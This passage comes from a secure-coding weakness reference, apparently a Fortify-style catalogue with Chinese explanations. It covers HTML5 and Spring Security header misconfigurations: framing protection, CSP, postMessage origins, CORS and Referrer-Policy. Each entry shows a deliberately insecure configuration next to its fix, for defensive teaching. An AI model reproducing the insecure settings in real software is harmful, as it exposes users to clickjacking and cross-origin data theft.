<p>[6] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1) </p>
<p>[8] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.1.3 Input Validation Requirements, 5.1.4 Input Validation Requirements </p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls </p>
<p>[10] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration </p>
<p>[11] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration </p>
<p>[12] Standards Mapping - OWASP Top 10 2017 A6 Security Misconfiguration </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.6 </p>
<p>[17] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[28] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15) </p>
<h4 id="HTML5-Missing-Framing-Protection"><a href="#HTML5-Missing-Framing-Protection" class="headerlink" title="HTML5: Missing Framing Protection"></a>HTML5: Missing Framing Protection</h4><h5 id="ABSTRACT-99"><a href="#ABSTRACT-99" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>应用程序不会限制浏览器从第三方站点呈现其内容。</p>
<h5 id="EXPLANATION-100"><a href="#EXPLANATION-100" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>允许将您的网站添加到框架会引发安全问题。例如，这可能引发 Clickjacking 漏洞或允许异常的跨框架通信。</p>
<p>默认情况下，Spring Security 等框架将 X-Frame-Options 标头包含在内，从而指示浏览器是否应对应用程序进行组帧。禁用或不设置此标头会引发与跨框架相关的漏洞。</p>
<p>示例 1：以下代码配置了受 Spring Security 保护的应用程序，以禁用 X-Frame-Options 标头：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;http auto-config=&quot;true&quot;&gt;</span><br><span class="line"></span><br><span class="line">       ...</span><br><span class="line"></span><br><span class="line">       &lt;headers&gt;</span><br><span class="line"></span><br><span class="line">           ...</span><br><span class="line"></span><br><span class="line">           &lt;frame-options disabled=&quot;true&quot;/&gt;</span><br><span class="line"></span><br><span class="line">       &lt;/headers&gt;</span><br><span class="line"></span><br><span class="line">&lt;/http&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-101"><a href="#RECOMMENDATIONS-101" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将 X-Frame-Options 标头设置为额外的保护层。若从不需要对应用程序进行组帧，请将其值设置为 DENY；若需要由同源的其他应用程序或页面进行组帧，请将其值设置为 SAMEORIGIN。</p>
<p>默认情况下，Spring Security 会禁用 iframe 中的呈现。可自定义 X-Frame-Options 标头来满足应用程序的需求。</p>
<p>示例 2：以下代码将受 Spring Security 保护的应用程序配置为使用 SAMEORIGIN 策略： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;http auto-config=&quot;true&quot;&gt;</span><br><span class="line"></span><br><span class="line">       ...</span><br><span class="line"></span><br><span class="line">       &lt;headers&gt;</span><br><span class="line"></span><br><span class="line">           ...</span><br><span class="line"></span><br><span class="line">           &lt;frame-options policy=&quot;SAMEORIGIN&quot;/&gt;</span><br><span class="line"></span><br><span class="line">       &lt;/headers&gt;</span><br><span class="line"></span><br><span class="line">&lt;/http&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-98"><a href="#REFERENCES-98" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 1021 </p>
<p>[2] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001368, CCI-001414 </p>
<p>[3] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1) </p>
<p>[5] Standards Mapping - OWASP Application Security Verification Standard 4.0 14.4.7 HTTP Security Headers Requirements </p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls </p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration </p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration </p>
<p>[9] Standards Mapping - OWASP Top 10 2017 A6 Security Misconfiguration </p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10 </p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6 </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.6 </p>
<p>[14] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[25] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15) </p>
<h4 id="HTML5-Overly-Permissive-Content-Security-Policy"><a href="#HTML5-Overly-Permissive-Content-Security-Policy" class="headerlink" title="HTML5: Overly Permissive Content Security Policy"></a>HTML5: Overly Permissive Content Security Policy</h4><h5 id="ABSTRACT-100"><a href="#ABSTRACT-100" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>内容安全策略 (CSP) 配置了过于宽松的策略，可能造成安全风险。</p>
<h5 id="EXPLANATION-101"><a href="#EXPLANATION-101" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>内容安全策略 (CSP) 是声明性安全标头，使开发人员可以在浏览器中指定允许的安全相关行为，包括可从中检索内容的位置白名单。它提供额外的安全层以避免重大漏洞，如 Cross-Site Scripting、Clickjacking、Cross-origin Access 等，此外还有输入验证以及代码中的白名单。但配置不恰当的标头无法提供此额外的安全层。该策略是在 15 条指令的帮助下定义的，包括 8 条控制资源访问的指令：script-src、img-data-src、object-src、style_src、font-src、media-src、frame-src、connect-src。这 8 条指令将源列表作为值，该值指定站点可访问的域，以使用该指令涵盖的功能。开发人员可使用通配符 * 表示所有或部分数据源。其他源列表关键字（例如 ‘unsafe-inline’ 和 ‘unsafe-eval’）提供了对脚本执行的更精细控制，但可能有害。所有的指令都不是强制性的。浏览器允许对未列出的指令使用所有的数据源，或者允许从可选 default-src 指令中衍生其值。此外，此标头的规范也在不断发展。在 Firefox V23 和 IE V10 以前，它作为 X-Content-Security-Policy 实现，在 Chrome V25 以前，作为 X-Webkit-CSP 实现。这两个名称现在均已弃用，目前使用的标准名称为 Content Security Policy。鉴于指令数、两个弃用的备用名称以及在单个标头中相同标头和重复指令多次出现的处理方式，开发人员很有可能会错误地配置此标头。</p>
<p>示例 1：以下代码设置了过度宽松且不安全的 default-src 指令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;http auto-config=&quot;true&quot;&gt;</span><br><span class="line"></span><br><span class="line">       ...</span><br><span class="line"></span><br><span class="line">       &lt;headers&gt;</span><br><span class="line"></span><br><span class="line">           ...</span><br><span class="line"></span><br><span class="line">           &lt;content-security-policy policy-directives=&quot;default-src &apos;*&apos;&quot; /&gt;</span><br><span class="line"></span><br><span class="line">       &lt;/headers&gt;</span><br><span class="line"></span><br><span class="line">   &lt;/http&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-102"><a href="#RECOMMENDATIONS-102" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>对于 CSP 源列表值，请使用受信任域的显式列表，而不要使用常规通配符 *。另外，避免使用任何允许潜在不安全脚本行为的指令，例如 ‘unsafe-inline’ 或 ‘unsafe-eval’。</p>
<p>示例 2：以下 Spring Security 应用程序会针对 default-src 指令设置特定域：</p>
<pre><code>&lt;http auto-config=&quot;true&quot;&gt;

    ...

    &lt;headers&gt;

        ...

        &lt;content-security-policy policy-directives=&quot;default-src https://content.cdn.example.com&quot; /&gt;

    &lt;/headers&gt;

&lt;/http&gt;
</code></pre><h5 id="REFERENCES-99"><a href="#REFERENCES-99" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] OWASP Content Security Policy </p>
<p>[2] W3C Content Security Policy 1.1 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001368, CCI-001414 </p>
<p>[4] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1) </p>
<p>[6] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration </p>
<p>[7] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration </p>
<p>[8] Standards Mapping - OWASP Top 10 2017 A6 Security Misconfiguration </p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10 </p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8 </p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8 </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.8 </p>
<p>[15] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 5.4 - Authentication and Access Control </p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[26] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15) </p>
<h4 id="HTML5-Overly-Permissive-Message-Posting-Policy"><a href="#HTML5-Overly-Permissive-Message-Posting-Policy" class="headerlink" title="HTML5: Overly Permissive Message Posting Policy"></a>HTML5: Overly Permissive Message Posting Policy</h4><h5 id="ABSTRACT-101"><a href="#ABSTRACT-101" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>程序发布了目标源过于宽松的跨文档消息。</p>
<h5 id="EXPLANATION-102"><a href="#EXPLANATION-102" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>HTML5 的一项新功能是跨文档消息传递。该功能允许脚本将消息发布到其他窗口。用户利用相应的 API 可指定目标窗口的源。不过，指定目标源时应小心谨慎，因为如果目标源过于宽松，恶意脚本就能趁机采用不当方式与受害者窗口进行通信，从而导致发生欺骗、数据被盗、转发及其他攻击。</p>
<p>示例 1：以下示例会使用通配符以编程方式指定要发送的消息的目标源。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WebMessage message = new WebMessage(WEBVIEW_MESSAGE);</span><br><span class="line"></span><br><span class="line">webview.postWebMessage(message, Uri.parse(&quot;*&quot;));</span><br></pre></td></tr></table></figure>
<p>使用 * 作为目标源的值表示无论源如何，脚本都会将消息发送到窗口。RECOMMENDATIONS</p>
<p>请不要将 * 作为目标源的值， 而是提供一个特定的目标源。</p>
<p>示例 2：以下代码会为目标源提供一个特定值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WebMessage message = new WebMessage(WEBVIEW_MESSAGE);</span><br><span class="line"></span><br><span class="line">webview.postWebMessage(message, Uri.parse(&quot;http://www.trusted.com&quot;));</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-100"><a href="#REFERENCES-100" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Michael Schmidt HTML5 Web Security </p>
<p>[2] Philippe De Ryck, Lieven Desmet, Pieter Philippaerts, and Frank Piessens A Security Analysis of Next Generation Web Standards </p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 942 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001368, CCI-001414 </p>
<p>[5] Standards Mapping - General Data Protection Regulation Access Violation </p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1) </p>
<p>[7] Standards Mapping - OWASP Application Security Verification Standard 4.0 14.4.6 HTTP Security Headers Requirements, 14.5.3 Validate HTTP Request Header Requirements </p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M5 Poor Authorization and Authentication </p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration </p>
<p>[10] Standards Mapping - OWASP Top 10 2017 A6 Security Misconfiguration </p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10 </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.8 </p>
<p>[17] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 5.4 - Authentication and Access Control </p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<h4 id="HTML5-Overly-Permissive-CORS-Policy"><a href="#HTML5-Overly-Permissive-CORS-Policy" class="headerlink" title="HTML5: Overly Permissive CORS Policy"></a>HTML5: Overly Permissive CORS Policy</h4><h5 id="ABSTRACT-102"><a href="#ABSTRACT-102" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>程序会定义过于宽松的跨源资源共享 (CORS) 策略。</p>
<h5 id="EXPLANATION-103"><a href="#EXPLANATION-103" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在 HTML5 以前的版本中，Web 浏览器必须执行同源策略 (Same Origin Policy)，以确保使用 JavaScript 来访问某个网页内容时，JavaScript 和网页都来源于相同的域。若不采取同源策略 (Same Origin Policy)，恶意网站便可以使用客户端凭证来运行 JavaScript，从其他网站加载的敏感信息，并对这些信息进行提炼，然后将其返回给攻击者。如果定义了名为 Access-Control-Allow-Origin 的新 HTTP 头文件，HTML5 就支持使用 JavaScript 跨域访问数据。通过这个头文件，Web 服务器可定义允许使用跨源请求访问服务器域的其他域。不过，定义头文件时应小心谨慎，如果 CORS 策略过于宽松，恶意应用程序就能趁机采用不正当方式与受攻击的应用程序进行通信，从而导致发生欺骗、数据被盗、转发及其他攻击。</p>
<p>示例 1：在以下示例中，使用通配符以编程方式指定允许应用程序与其通信的域。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;websocket:handlers allowed-origins=&quot;*&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;websocket:mapping path=&quot;/myHandler&quot; handler=&quot;myHandler&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/websocket:handlers&gt;</span><br></pre></td></tr></table></figure>
<p>将 * 作为 Access-Control-Allow-Origin 头文件的值表明，该应用程序的数据可供在任何域上运行的 JavaScript 访问。</p>
<h5 id="RECOMMENDATIONS-103"><a href="#RECOMMENDATIONS-103" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请不要使用 * 作为 Access-Control-Allow-Origin 头文件的值。而应该提供可信赖的域的显式列表。</p>
<p>示例 2：下面的 Access-Control-Allow-Origin 头文件指定了一个显示可信赖的域。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;websocket:handlers allowed-origins=&quot;www.trusted.com&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;websocket:mapping path=&quot;/myHandler&quot; handler=&quot;myHandler&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/websocket:handlers&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-101"><a href="#REFERENCES-101" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] W3C Cross-Origin Resource Sharing</p>
<p>[2] Enable Cross-Origin Resource Sharing</p>
<p>[3] Michael Schmidt HTML5 Web Security</p>
<p>[4] Philippe De Ryck, Lieven Desmet, Pieter Philippaerts, and Frank Piessens A Security Analysis of Next Generation Web Standards</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M5 Poor Authorization and Authentication</p>
<p>[7] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II</p>
<p>[16] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15)</p>
<h4 id="HTML5-Overly-Permissive-Referrer-Policy"><a href="#HTML5-Overly-Permissive-Referrer-Policy" class="headerlink" title="HTML5: Overly Permissive Referrer-Policy"></a>HTML5: Overly Permissive Referrer-Policy</h4><h5 id="ABSTRACT-103"><a href="#ABSTRACT-103" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>将 Referrer-Policy 标头设置为 Unsafe-URL 可能会导致应用程序向第三方站点暴露敏感站点和用户数据（包括会话标记、用户名和密码）。</p>
<h5 id="EXPLANATION-104"><a href="#EXPLANATION-104" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>默认情况下，浏览器不会将包含来自 HTTPS 之请求的引用标头发送到未加密的 HTTP 链接。然而，请求目标若也为 HTTPS，无论来源如何，都将发送标头。开发人员可能会将敏感信息留在 URL 中，这些敏感信息会通过引用标头向第三方站点暴露。Referrer-Policy 标头会被引入，以控制与引用标头相关的浏览器行为。Unsafe-URL 选项会删除所有限制，并随每一个请求发送引用标头。 </p>
<p>示例：以下代码配置了受 Spring Security 保护的应用程序，以禁用默认的安全引用策略：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;http auto-config=&quot;true&quot;&gt;</span><br><span class="line"></span><br><span class="line">       ...</span><br><span class="line"></span><br><span class="line">       &lt;headers&gt;</span><br><span class="line"></span><br><span class="line">           ...</span><br><span class="line"></span><br><span class="line">           &lt;referrer-policy policy=&quot;unsafe-url&quot;/&gt;</span><br><span class="line"></span><br><span class="line">       &lt;/headers&gt;</span><br><span class="line"></span><br><span class="line">&lt;/http&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-104"><a href="#RECOMMENDATIONS-104" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>安全的做法是采用 same-origin 策略，这样可限制只有包含请求的引用标头才可发送到同源目标。Spring Security 等部分框架将此策略用作默认策略。在这些框架中，确保不更改安全默认值。</p>
<h5 id="REFERENCES-102"><a href="#REFERENCES-102" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Referrer-Policy </p>
<p>[2] OWASP OWASP List of useful HTTP headers </p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 942 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002418, CCI-002420, CCI-002421, CCI-002422 </p>
<p>[5] Standards Mapping - FIPS200 CM </p>
<p>[6] Standards Mapping - General Data Protection Regulation Access Violation </p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1) </p>
<p>[8] Standards Mapping - OWASP Application Security Verification Standard 4.0 14.4.6 HTTP Security Headers Requirements, 14.5.3 Validate HTTP Request Header Requirements </p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management </p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling </p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration </p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[13] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.10 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.8 </p>
<p>[21] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 5.4 - Authentication and Access Control </p>
<p>[22] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 732 </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
